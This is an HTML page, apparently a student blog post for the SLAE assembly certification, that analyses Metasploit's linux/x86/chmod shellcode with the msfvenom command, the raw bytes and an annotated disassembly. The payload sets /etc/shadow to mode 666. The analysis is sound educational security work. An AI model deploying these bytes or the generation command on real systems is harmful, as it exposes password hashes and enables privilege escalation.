@@ -1,0 +1,45 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>5.2: Metasploit chmod Shellcode Analysis</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-120451103-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-120451103-1');
+</script>
+
+</head>
+<body><div class="main"><div class="tree">
+<p><strong>Index</strong></p>
+<p><a href="About.html">About</a></p>
+
+<p><a href="Walkthroughs.html">Walkthroughs</a></p>
+
+<ol>
+<li><a href="Walkthroughs--HackTheBox_Jeeves_Walkthrough_and_Lessons.html">HackTheBox: Jeeves Walkthrough and Lessons</a></li>
+<li><a href="Walkthroughs--HackTheBox_Bashed_Walkthrough_and_Lessons.html">HackTheBox: Bashed Walkthrough and Lessons</a></li>
+<li><a href="Walkthroughs--HackTheBox_Chatterbox_Walkthrough_and_Lessons.html">HackTheBox: Chatterbox Walkthrough and Lessons</a></li>
+</ol>
+<p><a href="Courses.html">Courses</a></p>
+
+<ol>
+<li><a href="Courses--SLAE.html">SLAE</a></li>
+<ol>
+<li><a href="Courses--SLAE--1_TCP_Bind_Shellcode.html">1: TCP Bind Shellcode</a></li>
+<li><a href="Courses--SLAE--2_TCP_Reverse_Shell.html">2: TCP Reverse Shell</a></li>
+<li><a href="Courses--SLAE--3_Egghunter_Shellcode.html">3: Egghunter Shellcode</a></li>
+<li><a href="Courses--SLAE--4_Shellcode_Encoding_Scheme.html">4: Shellcode Encoding Scheme</a></li>
+<li><a href="Courses--SLAE--5.1_Metasploit_TCP_Bind_Shellcode_Analysis.html">5.1: Metasploit TCP Bind Shellcode Analysis</a></li>
+<li><a href="Courses--SLAE--5.2_Metasploit_chmod_Shellcode_Analysis.html">5.2: Metasploit chmod Shellcode Analysis</a></li>
+<li><a href="Courses--SLAE--5.3_Metasploit_exec_Shellcode_Analysis.html">5.3: Metasploit exec Shellcode Analysis</a></li>
+<li><a href="Courses--SLAE--6_Polymorphic_Shellcode.html">6: Polymorphic Shellcode</a></li>
+<li><a href="Courses--SLAE--7_Shellcode_Crypter.html">7: Shellcode Crypter</a></li>
+</ol></ol></div>
+<div class="page"><h1><b><u>5.2: Metasploit chmod Shellcode Analysis</u></b></h1>This is an analysis of Metasploit's linux/x86/chmod shellcode, generated using the following command:<br /><br /><code>msfvenom -f c -p linux/x86/chmod</code><br /><br /><img src="images\11-1.png" alt="images\11-1.png" /><br /><br />This command generated the following shellcode:<br /><br />"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80"<br /><br />It is possible to convert this shellcode to readable i86 assembly through use of the <strong>ndisasm</strong> utility (output truncated):<br /><br /><img src="images\11-2.png" alt="images\11-2.png" /><br /><br />While in a previous post I broke up Metasploit's TCP Bind shellcode into a series of code blocks, this shellcode is far more simple. I opted instead to leave it in its full form. I have added pseudocode comments that briefly explain the assembly code.<br /><br /><code>00000000  99                cdq<br />00000001  6A0F              push byte +0xf      ; stack = [15]<br />00000003  58                pop eax             ; eax = 15 (chmod) stack = []<br />00000004  52                push edx            ; stack = [0]<br />00000005  E80C000000        call 0x16           ; jump over this inline string<br />0000000A  2F                das                 ; /<br />0000000B  657463            gs jz 0x71          ; etc<br />0000000E  2F                das                 ; /<br />0000000F  7368              jnc 0x79            ; sh<br />00000011  61                popa                ; a<br />00000012  646F              fs outsd            ; do<br />00000014  7700              ja 0x16             ; w\0<br />00000016  5B                pop ebx             ; ebx = address_of_file; stack = []<br />00000017  68B6010000        push dword 0x1b6    ; stack = [oct 666]<br />0000001C  59                pop ecx             ; ecx = oct 666 stack = []<br />0000001D  CD80              int 0x80            ; invoke chmod<br />0000001F  6A01              push byte +0x1      ; stack = [1]<br />00000021  58                pop eax             ; eax = 1<br />00000022  CD80              int 0x80            ; invoke exit() syscall</code><br /><br />This shellcode loads the Linux system call number 15 into EAX, indicating that it will call the <strong>chmod</strong> function (as you'd expect).<br /><br /><img src="images\11-3.png" alt="images\11-3.png" /><br /><br />Most prominent in the shellcode is an inline string that represents the path to the file chmod will be called on. As you can see above, ndisasm interprets these bytes as instructions, but they actually form the string "/etc/shadow". When the <code>call</code> instruction at address 0005 is executed, the address of this string is pushed onto the stack and the flow of control will be directed to address 0016. <br /><br />The shellcode then saves the address of the string in EBX, satisfying the "pathname" parameter shown in the function declaration above. Then ECX is loaded with the hex equivalent of octal 666, satisfying the "mode" parameter. The chmod system call is then invoked through the use of an interrupt.<br /><br />Finally, the shellcode invokes the <strong>exit</strong> system call to end the current process.<br /><br />---<br /><br /><em>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:<br /></em><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a><em><br />Student ID: SLAE - 1353</em></div></div>
+</body></html>
